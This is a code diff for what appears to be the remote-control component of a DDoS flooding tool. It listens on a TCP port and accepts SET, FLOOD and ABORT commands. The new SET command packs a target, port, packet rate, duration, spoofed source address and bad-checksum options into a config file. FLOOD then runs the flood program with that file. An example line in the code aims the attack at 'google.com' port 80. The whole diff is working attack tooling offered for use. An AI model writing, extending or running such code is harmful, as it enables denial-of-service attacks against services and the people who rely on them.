@@ -1,21 +1,40 @@
+/*
+ * Copyright (c) 2025, oldteam. All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright notice, this
+ *    list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright notice,
+ *   this list of conditions and the following disclaimer in the documentation
+ *   and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+ * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+ * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
+ * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+ * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+ * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
+ * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+ * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+ * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+*/
+
 #include "../../include/include.h"
+
+/* target dstport method unlimit source pps time interface random scrport badsum */
+/* "google.com" 80 0 1 ARAND 100 5 NULL 3 ARAND 0 */
 
 #define SERVERPORT	7779
 
 #define CMD_FLOOD	"FLOOD"
-#define CMD_HOST	"HOST"
-#define CMD_PORT	"PORT"
-#define CMD_PPS		"PPS"
-#define CMD_TIME	"TIME"
-#define CMD_METHOD	"METHOD"
 #define CMD_ABORT	"ABORT"
+#define CMD_SET		"SET"
 #define CMD_DOWN	"DOWN"
 
-char	pps[1024];
-char	time_[1024];
-char	port[1024];
-char	host[1024];
-char	method[1024];
+char	config[65535];
 int	fd=-1, fdc=-1;
 pid_t	curcmdpid=-1;
 char	*prog=NULL;
@@ -73,20 +92,26 @@ static inline void floodexec(char *cmd)
 		curcmdpid=pid;
 }
 
-void remove_spaces(char *str)
+static inline ssize_t writedata(int fd, const void *buf, size_t count)
 {
-	int i=0,j=0;
-	while (str[i]!='\0') {
-		if (str[i]!=' ')
-			str[j++]=str[i];
-		i++;
+	size_t total_written=0,written=0;
+	const char *ptr=buf;
+
+	while (total_written<count) {
+		written=write(fd,ptr+total_written,count-total_written);
+		if (written==-1)
+			return -1;
+		total_written+=written;
 	}
-	str[j]='\0';
+	return total_written;
 }
 
 static inline void command(char *cmd)
 {
 	char first[100],rest[100],res[65535];
+	char *tokens[100];
+	char *tok;
+	int n,fd;
 
 	memset(rest,0,sizeof(rest));
 	memset(first,0,sizeof(first));
@@ -94,47 +119,34 @@ static inline void command(char *cmd)
 	cmd[strcspn(cmd,"\r\n")]='\0';
 	sscanf(cmd,"%s %[^\n]",first,rest);
 
-	remove_spaces(rest);
-	remove_spaces(first);
-
 	if (!(strncmp(first, CMD_ABORT, sizeof(CMD_ABORT)-1))) {
 		abortcmd();
 		return;
 	}
-	if (!(strncmp(first, CMD_HOST, sizeof(CMD_HOST)-1))) {
-		memset(host,0,sizeof(host));
-		snprintf(host,sizeof(host),"%s", rest);
-		msgl("set host %s\n", host);
-		return;
-	}
-	if (!(strncmp(first, CMD_PORT, sizeof(CMD_PORT)-1))) {
-		memset(port,0,sizeof(port));
-		snprintf(port,sizeof(port),"%s", rest);
-		msgl("set port %s\n", port);
-		return;
-	}
-	if (!(strncmp(first, CMD_PPS, sizeof(CMD_PPS)-1))) {
-		memset(pps,0,sizeof(pps));
-		snprintf(pps,sizeof(pps),"%s", rest);
-		msgl("set pps %s\n", pps);
-		return;
-	}
-	if (!(strncmp(first, CMD_TIME, sizeof(CMD_TIME)-1))) {
-		memset(time_,0,sizeof(time_));
-		snprintf(time_,sizeof(time_),"%s", rest);
-		msgl("set time %s\n", time_);
-		return;
-	}
-	if (!(strncmp(first, CMD_METHOD, sizeof(CMD_METHOD)-1))) {
-		memset(method,0,sizeof(method));
-		snprintf(method,sizeof(method),"%s", rest);
-		msgl("set method %s\n", method);
+	if (!(strncmp(first, CMD_SET, sizeof(CMD_SET)-1))) {
+		memset(config,0,sizeof(config));
+		memset(tokens, 0, sizeof(tokens));
+		n=0;
+		tok=strtok(rest," ");
+		while (tok&&n<100) {
+			tokens[n++]=tok;
+			tok=strtok(NULL," ");
+		}
+		snprintf(config,sizeof(config),
+			"target=%s;dstport=%s;method=%s;unlimit=%s;"
+			"source=%s;pps=%s;time=%s;interface=%s;random=%s;"
+			"srcport=%s;badsum=%s;",
+			tokens[0],tokens[1],tokens[2],tokens[3],tokens[4],tokens[5],
+			tokens[6],tokens[7],tokens[8],tokens[9],tokens[10]);
+		msgl("SET CONFIG %s\n", config);
 		return;
 	}
 	if (!(strncmp(first, CMD_FLOOD, sizeof(CMD_FLOOD)-1))) {
 		memset(res,0,sizeof(res));
-		snprintf(res,sizeof(res),"./%s %s %s %s %s %s",
-			prog,host,port,pps,time_,method);
+		assert((fd=open("tmpconfig",O_WRONLY|O_CREAT|O_TRUNC,0644))!=-1);
+		writedata(fd,config,strlen(config));
+		close(fd);
+		snprintf(res,sizeof(res),"./%s tmpconfig", prog);
 		msgl("EXEC %s\n", res);
 		floodexec(res);
 		return;
